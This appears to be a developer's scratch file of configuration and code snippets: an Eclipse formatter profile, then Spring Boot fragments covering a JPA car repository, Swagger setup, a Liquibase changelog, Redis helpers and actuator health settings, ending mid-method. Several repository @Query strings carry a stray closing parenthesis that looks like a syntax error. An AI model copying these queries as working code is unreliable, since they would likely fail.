<setting id="org.eclipse.jdt.core.formatter.insert_space_after_opening_angle_bracket_in_parameterized_type_reference" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.comment.indent_root_tags" value="true"/>
<setting id="org.eclipse.jdt.core.formatter.wrap_before_or_operator_multicatch" value="true"/>
<setting id="org.eclipse.jdt.core.formatter.enabling_tag" value="@formatter:on"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_closing_brace_in_block" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_parenthesized_expression_in_return" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.alignment_for_throws_clause_in_method_declaration" value="0"/>
<setting id="org.eclipse.jdt.core.formatter.insert_new_line_after_annotation_on_parameter" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.keep_then_statement_on_same_line" value="false"/>
<setting id="org.eclipse.jdt.core.formatter.insert_new_line_after_annotation_on_field" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_comma_in_explicitconstructorcall_arguments" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_new_line_in_empty_block" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_prefix_operator" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.blank_lines_between_type_declarations" value="1"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_closing_brace_in_array_initializer" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_closing_paren_in_for" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_opening_paren_in_catch" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_opening_angle_bracket_in_type_arguments" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_new_line_after_annotation_on_method" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_opening_paren_in_switch" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_opening_brace_in_anonymous_type_declaration" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_closing_paren_in_parenthesized_expression" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.never_indent_line_comments_on_first_column" value="false"/>
<setting id="org.eclipse.jdt.core.compiler.problem.enumIdentifier" value="error"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_and_in_type_parameter" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_comma_in_for_inits" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.indent_statements_compare_to_block" value="true"/>
<setting id="org.eclipse.jdt.core.formatter.brace_position_for_anonymous_type_declaration" value="end_of_line"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_question_in_wildcard" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_opening_paren_in_annotation" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_comma_in_method_invocation_arguments" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_opening_brace_in_switch" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.comment.line_length" value="80"/>
<setting id="org.eclipse.jdt.core.formatter.use_on_off_tags" value="true"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_between_empty_brackets_in_array_allocation_expression" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_opening_brace_in_enum_constant" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_between_empty_parens_in_method_invocation" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_assignment_operator" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_opening_brace_in_type_declaration" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_opening_paren_in_for" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.comment.preserve_white_space_between_code_and_line_comments" value="false"/>
<setting id="org.eclipse.jdt.core.formatter.insert_new_line_after_annotation_on_local_variable" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.brace_position_for_method_declaration" value="end_of_line"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_closing_paren_in_method_invocation" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.alignment_for_union_type_in_multicatch" value="0"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_colon_in_for" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.number_of_blank_lines_at_beginning_of_method_body" value="0"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_closing_angle_bracket_in_type_arguments" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.keep_else_statement_on_same_line" value="false"/>
<setting id="org.eclipse.jdt.core.formatter.alignment_for_binary_expression" value="0"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_comma_in_parameterized_type_reference" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_comma_in_array_initializer" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_comma_in_multiple_field_declarations" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_comma_in_annotation" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.alignment_for_arguments_in_explicit_constructor_call" value="0"/>
<setting id="org.eclipse.jdt.core.formatter.indent_body_declarations_compare_to_annotation_declaration_header" value="true"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_comma_in_superinterfaces" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_colon_in_default" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_question_in_conditional" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.brace_position_for_block" value="end_of_line"/>
<setting id="org.eclipse.jdt.core.formatter.brace_position_for_constructor_declaration" value="end_of_line"/>
<setting id="org.eclipse.jdt.core.formatter.compact_else_if" value="true"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_comma_in_type_parameters" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_opening_paren_in_catch" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_opening_paren_in_method_invocation" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.put_empty_statement_on_new_line" value="false"/>
<setting id="org.eclipse.jdt.core.formatter.alignment_for_parameters_in_constructor_declaration" value="0"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_comma_in_method_invocation_arguments" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.alignment_for_arguments_in_method_invocation" value="0"/>
<setting id="org.eclipse.jdt.core.formatter.alignment_for_throws_clause_in_constructor_declaration" value="0"/>
<setting id="org.eclipse.jdt.core.compiler.problem.assertIdentifier" value="error"/>
<setting id="org.eclipse.jdt.core.formatter.comment.clear_blank_lines_in_block_comment" value="true"/>
<setting id="org.eclipse.jdt.core.formatter.insert_new_line_before_catch_in_try_statement" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_opening_paren_in_try" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_new_line_at_end_of_file_if_missing" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.comment.clear_blank_lines_in_javadoc_comment" value="true"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_comma_in_array_initializer" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_binary_operator" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_unary_operator" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.alignment_for_expressions_in_array_initializer" value="0"/>
<setting id="org.eclipse.jdt.core.formatter.format_line_comment_starting_on_first_column" value="true"/>
<setting id="org.eclipse.jdt.core.formatter.number_of_empty_lines_to_preserve" value="1"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_colon_in_case" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_ellipsis" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_semicolon_in_try_resources" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_colon_in_assert" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_closing_paren_in_if" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_comma_in_type_arguments" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_and_in_type_parameter" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_new_line_in_empty_type_declaration" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_opening_paren_in_parenthesized_expression" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.comment.format_line_comments" value="true"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_colon_in_labeled_statement" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.align_type_members_on_columns" value="false"/>
<setting id="org.eclipse.jdt.core.formatter.alignment_for_assignment" value="0"/>
<setting id="org.eclipse.jdt.core.formatter.insert_new_line_in_empty_method_body" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.indent_body_declarations_compare_to_type_header" value="true"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_between_empty_parens_in_method_declaration" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_opening_paren_in_enum_constant" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.alignment_for_superinterfaces_in_type_declaration" value="0"/>
<setting id="org.eclipse.jdt.core.formatter.blank_lines_before_first_class_body_declaration" value="0"/>
<setting id="org.eclipse.jdt.core.formatter.alignment_for_conditional_expression" value="0"/>
<setting id="org.eclipse.jdt.core.formatter.insert_new_line_before_closing_brace_in_array_initializer" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_comma_in_constructor_declaration_parameters" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.format_guardian_clause_on_one_line" value="false"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_opening_paren_in_if" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_new_line_after_annotation_on_type" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_opening_brace_in_block" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.brace_position_for_enum_declaration" value="end_of_line"/>
<setting id="org.eclipse.jdt.core.formatter.brace_position_for_block_in_case" value="end_of_line"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_closing_paren_in_constructor_declaration" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.comment.format_header" value="false"/>
<setting id="org.eclipse.jdt.core.formatter.alignment_for_arguments_in_allocation_expression" value="0"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_opening_paren_in_method_invocation" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_opening_paren_in_while" value="insert"/>
<setting id="org.eclipse.jdt.core.compiler.codegen.inlineJsrBytecode" value="enabled"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_closing_paren_in_switch" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.alignment_for_method_declaration" value="0"/>
<setting id="org.eclipse.jdt.core.formatter.join_wrapped_lines" value="true"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_between_empty_parens_in_constructor_declaration" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.indent_switchstatements_compare_to_cases" value="true"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_closing_bracket_in_array_allocation_expression" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_closing_paren_in_synchronized" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.comment.new_lines_at_javadoc_boundaries" value="true"/>
<setting id="org.eclipse.jdt.core.formatter.brace_position_for_annotation_type_declaration" value="end_of_line"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_colon_in_for" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.alignment_for_resources_in_try" value="0"/>
<setting id="org.eclipse.jdt.core.formatter.use_tabs_only_for_leading_indentations" value="false"/>
<setting id="org.eclipse.jdt.core.formatter.alignment_for_selector_in_method_invocation" value="0"/>
<setting id="org.eclipse.jdt.core.formatter.never_indent_block_comments_on_first_column" value="false"/>
<setting id="org.eclipse.jdt.core.compiler.source" value="1.7"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_opening_paren_in_synchronized" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_comma_in_constructor_declaration_throws" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.tabulation.size" value="3"/>
<setting id="org.eclipse.jdt.core.formatter.insert_new_line_in_empty_enum_constant" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_comma_in_allocation_expression" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_opening_bracket_in_array_reference" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_colon_in_conditional" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.comment.format_source_code" value="true"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_opening_brace_in_array_initializer" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_closing_paren_in_try" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_semicolon_in_try_resources" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.blank_lines_before_field" value="0"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_at_in_annotation" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.continuation_indentation_for_array_initializer" value="2"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_question_in_wildcard" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.blank_lines_before_method" value="1"/>
<setting id="org.eclipse.jdt.core.formatter.alignment_for_superclass_in_type_declaration" value="0"/>
<setting id="org.eclipse.jdt.core.formatter.alignment_for_superinterfaces_in_enum_declaration" value="0"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_parenthesized_expression_in_throw" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_colon_in_labeled_statement" value="do not insert"/>
<setting id="org.eclipse.jdt.core.compiler.codegen.targetPlatform" value="1.7"/>
<setting id="org.eclipse.jdt.core.formatter.brace_position_for_switch" value="end_of_line"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_comma_in_superinterfaces" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_comma_in_method_declaration_parameters" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_opening_brace_in_array_initializer" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_opening_paren_in_parenthesized_expression" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.comment.format_html" value="true"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_at_in_annotation_type_declaration" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_closing_angle_bracket_in_type_parameters" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.alignment_for_compact_if" value="0"/>
<setting id="org.eclipse.jdt.core.formatter.indent_empty_lines" value="false"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_comma_in_parameterized_type_reference" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_unary_operator" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_opening_paren_in_enum_constant" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.alignment_for_arguments_in_annotation" value="0"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_comma_in_enum_declarations" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.keep_empty_array_initializer_on_one_line" value="false"/>
<setting id="org.eclipse.jdt.core.formatter.indent_switchstatements_compare_to_switch" value="true"/>
<setting id="org.eclipse.jdt.core.formatter.insert_new_line_before_else_in_if_statement" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_assignment_operator" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_opening_paren_in_constructor_declaration" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.blank_lines_before_new_chunk" value="1"/>
<setting id="org.eclipse.jdt.core.formatter.insert_new_line_after_label" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.indent_body_declarations_compare_to_enum_declaration_header" value="true"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_opening_bracket_in_array_allocation_expression" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_opening_paren_in_constructor_declaration" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_colon_in_conditional" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_opening_angle_bracket_in_parameterized_type_reference" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_comma_in_method_declaration_parameters" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_closing_angle_bracket_in_type_arguments" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_closing_paren_in_cast" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_colon_in_assert" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.blank_lines_before_member_type" value="1"/>
<setting id="org.eclipse.jdt.core.formatter.insert_new_line_before_while_in_do_statement" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_opening_bracket_in_array_type_reference" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_closing_angle_bracket_in_parameterized_type_reference" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.alignment_for_arguments_in_qualified_allocation_expression" value="0"/>
<setting id="org.eclipse.jdt.core.formatter.insert_new_line_after_opening_brace_in_array_initializer" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_new_line_in_empty_enum_declaration" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.indent_breaks_compare_to_cases" value="true"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_closing_paren_in_method_declaration" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_opening_paren_in_if" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_semicolon" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_postfix_operator" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_opening_paren_in_try" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_opening_angle_bracket_in_type_arguments" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_opening_paren_in_cast" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.comment.format_block_comments" value="true"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_opening_paren_in_method_declaration" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.keep_imple_if_on_one_line" value="true"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_opening_brace_in_enum_declaration" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.alignment_for_parameters_in_method_declaration" value="0"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_between_brackets_in_array_type_reference" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_opening_angle_bracket_in_type_parameters" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_semicolon_in_for" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_comma_in_method_declaration_throws" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_opening_bracket_in_array_allocation_expression" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.indent_statements_compare_to_body" value="true"/>
<setting id="org.eclipse.jdt.core.formatter.alignment_for_multiple_fields" value="16"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_comma_in_enum_constant_arguments" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_prefix_operator" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.brace_position_for_array_initializer" value="end_of_line"/>
<setting id="org.eclipse.jdt.core.formatter.wrap_before_binary_operator" value="true"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_opening_brace_in_method_declaration" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_comma_in_type_parameters" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_closing_paren_in_catch" value="do not insert"/>
<setting id="org.eclipse.jdt.core.compiler.compliance" value="1.7"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_closing_bracket_in_array_reference" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_comma_in_annotation" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_comma_in_enum_constant_arguments" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_between_empty_braces_in_array_initializer" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_colon_in_case" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_comma_in_multiple_local_declarations" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_opening_brace_in_annotation_type_declaration" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_opening_bracket_in_array_reference" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_opening_paren_in_method_declaration" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.wrap_outer_expressions_when_nested" value="true"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_closing_paren_in_cast" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.brace_position_for_enum_constant" value="end_of_line"/>
<setting id="org.eclipse.jdt.core.formatter.brace_position_for_type_declaration" value="end_of_line"/>
<setting id="org.eclipse.jdt.core.formatter.blank_lines_before_package" value="0"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_opening_paren_in_for" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_opening_paren_in_synchronized" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_comma_in_for_increments" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_opening_paren_in_annotation_type_member_declaration" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_opening_paren_in_while" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_closing_paren_in_enum_constant" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_comma_in_explicitconstructorcall_arguments" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_closing_paren_in_annotation" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_opening_angle_bracket_in_type_parameters" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.indent_body_declarations_compare_to_enum_constant_header" value="true"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_opening_brace_in_constructor_declaration" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_comma_in_constructor_declaration_throws" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.join_lines_in_comments" value="true"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_closing_angle_bracket_in_type_parameters" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_question_in_conditional" value="insert"/>
<setting id="org.eclipse.jdt.core.formatter.comment.indent_parameter_description" value="true"/>
<setting id="org.eclipse.jdt.core.formatter.insert_new_line_before_finally_in_try_statement" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.tabulation.char" value="tab"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_comma_in_multiple_field_declarations" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.blank_lines_between_import_groups" value="1"/>
<setting id="org.eclipse.jdt.core.formatter.lineSplit" value="80"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_after_opening_paren_in_annotation" value="do not insert"/>
<setting id="org.eclipse.jdt.core.formatter.insert_space_before_opening_paren_in_switch" value="insert"/>
</profile>
</profiles>
--------------------------------------------------------------------------------------------------------
import java.util.List;

import javax.validation.Valid;

import org.springframework.data.jpa.repository.Modifying;
import org.springframework.data.jpa.repository.Query;
import org.springframework.data.repository.CrudRepository;
import org.springframework.data.repository.query.Param;
import org.springframework.data.rest.core.annotation.RestResource;
import org.springframework.transaction.annotation.Transactional;

import com.carsexample.domain.Car;

public interface CarRepository extends CrudRepository<Car, Long> {

	<S extends Car> S save(@Valid S cars);
	
	@RestResource(exported = false)
	@Query("SELECT c.id FROM Car c WHERE idCar = :idCar)")
	Long getIdFromIdCar(@Param("idCar") Long idCar);
	
	@RestResource(exported = false)
	@Query("SELECT c FROM Car c WHERE c.idUser = :idUser)")
	List<Car> listCarsByUserId(@Param("idUser") Long idUser);
	
	@RestResource(exported = false)
	@Query("SELECT c.isDefault FROM Car c WHERE c.idUser = :idUser AND c.idCar = :idCar)")
	boolean checkDefault(@Param("idUser") Long idUser, @Param("idCar") Long idCar);
	
}

@Table(name="\"Car\"", catalog="postgres", schema="public")

	
	@JsonProperty("created_at")
	@Column(name="created_at", columnDefinition="TIMESTAMP DEFAULT CURRENT_TIMESTAMP", updatable=false)
	@CreationTimestamp
	@Temporal(TemporalType.TIMESTAMP)
	private Date createdAt;
--------------------------------------------------------------------------------------------------------
spring.jpa.properties.hibernate.default_schema=public
--------------------------------------------------------------------------------------------------------
    @Bean
    public Docket api() {
        return new Docket(DocumentationType.SWAGGER_2)
                .select()
                .apis(RequestHandlerSelectors.any())
                //.paths(matchPathRegex("/cars(/\\{id\\}|$)"))
                .paths(PathSelectors.any())
                .build();
    }


    private static Predicate<String> matchPathRegex(final String... pathRegexs) {
        return new Predicate<String>() {
            @Override
            public boolean apply(String input) {
                for (String pathRegex : pathRegexs) {
                    if (input.matches(pathRegex)) {
                        return true;
                    }
                }
                return false;
            }
        };
    }
   @Bean
    WebMvcConfigurer configurer () {
        return new WebMvcConfigurerAdapter() {
            @Override
            public void addResourceHandlers (ResourceHandlerRegistry registry) {
                registry.addResourceHandler("/config/cars.json").
                        addResourceLocations("classpath:/config");
            }
        };
    }
	
import java.util.ArrayList;
import java.util.List;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Primary;

import springfox.documentation.swagger.web.InMemorySwaggerResourcesProvider;
import springfox.documentation.swagger.web.SwaggerResource;
import springfox.documentation.swagger.web.SwaggerResourcesProvider;

@Configuration
public class SwaggerWsEndpointsConfig {

    @Primary
    @Bean
    public SwaggerResourcesProvider swaggerResourcesProvider(InMemorySwaggerResourcesProvider defaultResourcesProvider) {
        return () -> {
            SwaggerResource wsResource = new SwaggerResource();
            wsResource.setName("cars");
            wsResource.setSwaggerVersion("2.0");
            wsResource.setLocation("/config/cars.json");

            List<SwaggerResource> resources = new ArrayList<>(defaultResourcesProvider.get());
            resources.add(wsResource);
            return resources;
        };
    }
}
--------------------------------------------------------------------------------------------------------
databaseChangeLog:
    - includeAll:
        path: db/changelog/changes/
		
databaseChangeLog:
- changeSet:
    id: 1520978027917-1
    author: gonzalo (generated)
    changes:
    - createTable:
        columns:
        - column:
            constraints:
              nullable: false
            name: id
            type: BIGINT
        - column:
            constraints:
              nullable: false
            name: brand
            type: VARCHAR(255)
        - column:
            defaultValueComputed: CURRENT_TIMESTAMP
            name: created_at
            type: TIMESTAMP WITHOUT TIME ZONE
        - column:
            constraints:
              nullable: false
            name: id_car
            type: BIGINT
        - column:
            constraints:
              nullable: false
            name: id_user
            type: BIGINT
        - column:
            name: is_default
            type: BOOLEAN
        - column:
            constraints:
              nullable: false
            name: model
            type: VARCHAR(255)
        tableName: Car
- changeSet:
    id: 1520978027917-2
    author: gonzalo (generated)
    changes:
    - addPrimaryKey:
        columnNames: id
        constraintName: CarPK
        tableName: Car
--------------------------------------------------------------------------------------------------------
@Component
public class RedisObjectHelper {

    @Resource
    private RedisTemplate<String, ?> redisTemplate;
    private HashOperations<String, byte[], byte[]> hashOperations;
    private HashMapper<Object, byte[], byte[]> mapper;

    @PostConstruct
    public void init() {
        mapper = new ObjectHashMapper(new CustomConversions(Arrays.asList(new Timestamp2ByteConverter(), new Byte2TimestampConverter())));
        hashOperations = redisTemplate.opsForHash();
    }
    // and any methods
}
--------------------------------------------------------------------------------------------------------
SimpleKeyValueRepository
--------------------------------------------------------------------------------------------------------

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.redis.core.RedisTemplate;
import org.springframework.stereotype.Service;

import java.util.concurrent.TimeUnit;

@Service
public class RedisService {

    @Autowired
    private RedisTemplate< String, Object > template;

    public Object getValue(final String key) {
        return template.opsForValue().get(key);
    }

    public void setValue(final String key, final String value) {
        template.opsForValue().set(key, value);

        // set a expire for a message
        template.expire(key, 5, TimeUnit.SECONDS);
    }

}
--------------------------------------------------------------------------------------------------------
management.health.status.order=FATAL, DOWN, OUT_OF_SERVICE, UNKNOWN, UP
The HTTP status code in the response reflects the overall health status (for example, UP maps to 200, while OUT_OF_SERVICE and DOWN map to 503). You might also want to register custom status mappings if you access the health endpoint over HTTP. For example, the following property maps FATAL to 503 (service unavailable):

management.health.status.http-mapping.FATAL=503

--------------------------------------------------------------------------------------------------------
@Override
protected void configureJacksonObjectMapper(ObjectMapper objectMapper) {
    objectMapper.registerModule(new SimpleModule("MyCustomModule") {
        @Override
        public void setupModule(SetupContext context) {
